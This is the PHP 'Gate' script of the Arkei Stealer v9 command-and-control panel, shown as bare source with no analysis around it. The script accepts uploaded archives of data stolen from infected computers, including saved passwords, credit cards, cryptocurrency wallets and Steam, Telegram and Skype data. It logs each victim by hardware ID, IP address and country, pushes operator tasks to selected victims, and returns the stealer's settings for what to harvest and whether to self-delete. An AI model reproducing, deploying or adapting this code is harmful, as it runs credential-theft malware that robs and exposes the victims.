<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [index.php]
*    Gate
*/

error_reporting(0);

ini_set("upload_max_filesize", "255M");
ini_set("post_max_size", "256M");

require("app/config.php");
require('app/geoip/geoip.php');

$blacklist = array(".php", ".phtml", ".php3", ".php4", ".html", ".htm");

foreach ($blacklist as $item)
    if(preg_match("/$item\$/i", $_FILES['logs']['name'])) exit;
	
$hwid = checkParam($_POST["hwid"]);
$os = checkParam($_POST["os"]);
$platform = checkParam($_POST["platform"]);
$profile = checkParam($_POST["profile"]);
$username = checkParam($_POST["user"]);
$ip = $_SERVER["REMOTE_ADDR"];

$passwordsCount = checkParam($_POST["pcount"]);
$ccCount = checkParam($_POST["cccount"]);
$coinsCount = checkParam($_POST["ccount"]);
$filesCount = checkParam($_POST["fcount"]);
$steamCount = checkParam($_POST["steam"]);
$telegramCount = checkParam($_POST["telegram"]);
$skypeCount = checkParam($_POST["skype"]);

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);
	
if($profile != null)
{
	// it's upload log request
	
	$date = date("d/m/Y H:i:s");
	if($os == null){ $os = "Unknown"; }
	if($platform == null){ $os = "Unknown"; }
	$system = $os ." ". $platform; 
	if($passwordsCount == null) { $passwordsCount = 0; }
	if($ccCount == null) { $ccCount = 0; }
	if($coinsCount == null) { $coinsCount = 0; }
	if($filesCount == null) { $filesCount = 0; }
	
	$country = ip_code($ip);
	
	if($database)
	{
		$repeated_reports		= $database->query("SELECT * FROM `settings` WHERE `Name`='repeated_reports';")->fetch_array();
		
		$hwid			= mysqli_real_escape_string($database, $hwid);
		$os 			= mysqli_real_escape_string($database, $os);
		$platform 		= mysqli_real_escape_string($database, $platform);
		$profile 		= mysqli_real_escape_string($database, $profile);
		$username 		= mysqli_real_escape_string($database, $username);
		
		$passwordsCount = mysqli_real_escape_string($database, $passwordsCount);
		$ccCount 		= mysqli_real_escape_string($database, $ccCount);
		$coinsCount 	= mysqli_real_escape_string($database, $coinsCount);
		$filesCount 	= mysqli_real_escape_string($database, $filesCount);
		$steamCount 	= mysqli_real_escape_string($database, $steamCount);
		$telegramCount 	= mysqli_real_escape_string($database, $telegramCount);
		$skypeCount 	= mysqli_real_escape_string($database, $skypeCount);
		
		$uploadfile 	= $config["logs_folder"] ."/". basename($_FILES['logs']['name']);
		$user 			= $_FILES['logs']['name'];
		
		$user 			= mysqli_real_escape_string($database, $user);
		
		$checkReport 	= $database->query("SELECT * FROM `logs` WHERE `hwid`='$hwid' AND `ip`='$ip'")->fetch_array();
		
		if($repeated_reports["Value"] == "2")
		{
			if($checkReport["id"] != null)
			{
				goto task;
			}
		}
		
		if (move_uploaded_file($_FILES['logs']['tmp_name'], $uploadfile))
		{
			$zip = new ZipArchive;
			$reading = "";
			
			if ($zip->open(realpath($uploadfile)) === TRUE) 
			{
				$reading = $zip->getFromName("/passwords.txt");
				$zip->close();
				
				$passwordsCount = substr_count($reading, "Soft:");
			} 
			
			$database->query("INSERT INTO `logs`(`id`, `status`, `hwid`, `system`, `ip`, `country`, `date`, `profile`, `user`, `passwords`, `cc`, `coins`, `files`, `telegram`, `skype`, `steam`, `comment`) VALUES ('','0','$hwid','$system','$ip','$country','$date','$profile','$user','$passwordsCount','$ccCount','$coinsCount','$filesCount','$telegramCount','$skypeCount','$steamCount',' ')");
			$database->query("UPDATE `stats` SET `Value`=`Value`+1 WHERE `Name`='all_logs'");
			$database->query("UPDATE `stats` SET `Value`=`Value`+". $passwordsCount ." WHERE `Name`='all_files'");
			$database->query("UPDATE `profiles` SET `Count`=`Count`+1 WHERE `id`='$profile'");
			
			goto task;
		}
		else 
		{
			$database->query("UPDATE `stats` SET `Value`=`Value`+1 WHERE `Name`='errors'");
			echo "error";
		}
		
		task:
		$tasks = $database->query("SELECT * FROM `tasks` WHERE `status`='2' ORDER BY `id` LIMIT 10;");
		
		while ($task = $tasks->fetch_assoc())
		{
			$taskID = $task["id"];
			
			if($task["country"] == "*")
			{
				if($task["profile"] == "0")
				{
					$database->query("UPDATE `tasks` SET `success`=`success` + 1 WHERE `id`='$taskID'");
				
					if($task["success"] + 1 == $task["count"])
					{
						$database->query("UPDATE `tasks` SET `status`='1' WHERE `id`='$taskID'");
					}
				
					echo $task["task"];
				}
				else if($task["profile"] == $profile)
				{
					$database->query("UPDATE `tasks` SET `success`=`success` + 1 WHERE `id`='$taskID'");
				
					if($task["success"] + 1 == $task["count"])
					{
						$database->query("UPDATE `tasks` SET `status`='1' WHERE `id`='$taskID'");
					}
				
					echo $task["task"];
				}
			}
			else
			{
				$countries = explode(",", $task["country"]);
				
				foreach ($countries as $_country)
				{
					if($_country == $country)
					{
						if($task["profile"] == "0")
						{
							$database->query("UPDATE `tasks` SET `success`=`success` + 1 WHERE `id`='$taskID'");
						
							if($task["success"] + 1 == $task["count"])
							{
								$database->query("UPDATE `tasks` SET `status`='1' WHERE `id`='$taskID'");
							}
							
							echo $task["task"];
						}
						else if($task["profile"] == $profile)
						{
							$database->query("UPDATE `tasks` SET `success`=`success` + 1 WHERE `id`='$taskID'");
						
							if($task["success"] + 1 == $task["count"])
							{
								$database->query("UPDATE `tasks` SET `status`='1' WHERE `id`='$taskID'");
							}
							
							echo $task["task"];
						}
					}
				}
			}
		}
	}
	else
	{
		echo "error";
	}
}
else
{
	// it's config request
	$saved_passwords 		= $database->query("SELECT * FROM `settings` WHERE `Name`='saved_passwords';")->fetch_array();
	$self_delete	 		= $database->query("SELECT * FROM `settings` WHERE `Name`='self_delete';")->fetch_array();
	$cookies_autocomplete 	= $database->query("SELECT * FROM `settings` WHERE `Name`='cookies_autocomplete';")->fetch_array();
	$history 				= $database->query("SELECT * FROM `settings` WHERE `Name`='history';")->fetch_array();
	$cryptocurrency 		= $database->query("SELECT * FROM `settings` WHERE `Name`='cryptocurrency';")->fetch_array();
	$skype 					= $database->query("SELECT * FROM `settings` WHERE `Name`='skype';")->fetch_array();
	$steam 					= $database->query("SELECT * FROM `settings` WHERE `Name`='steam';")->fetch_array();
	$telegram 				= $database->query("SELECT * FROM `settings` WHERE `Name`='telegram';")->fetch_array();
	$screenshot 			= $database->query("SELECT * FROM `settings` WHERE `Name`='screenshot';")->fetch_array();
	$grabber 				= $database->query("SELECT * FROM `settings` WHERE `Name`='grabber';")->fetch_array();
	$grub_config 			= $database->query("SELECT * FROM `settings` WHERE `Name`='grub_files';")->fetch_array();
	$max_size 				= $database->query("SELECT * FROM `settings` WHERE `Name`='max_size';")->fetch_array();
	
	echo $saved_passwords["Value"].",".
		 $cookies_autocomplete["Value"].",".
		 $history["Value"].",".
		 $cryptocurrency["Value"].",".
		 $skype["Value"].",".
		 $steam["Value"].",".
		 $telegram["Value"].",".
		 $screenshot["Value"].",".
		 $grabber["Value"].",".
		 $grub_config["Value"].",".
		 $max_size["Value"].",".
		 $self_delete["Value"];
}
	
mysqli_close($database);
	
function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>